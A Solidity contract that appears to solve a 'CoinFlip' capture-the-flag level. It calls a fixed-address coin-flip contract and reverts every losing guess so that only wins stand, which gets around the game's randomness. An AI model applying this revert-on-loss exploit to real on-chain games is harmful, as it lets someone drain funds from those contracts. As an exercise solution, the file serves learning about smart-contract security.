// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface CF {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipSolution {
    CF public cf;

    constructor() {
        cf = CF(address(0x8F3AF9Fe4B8fD15bA5851D08A9A85EC62658E162));
    }

    function tryit() public {
        if (!cf.flip(true)) {
            revert();
        }
    }
}
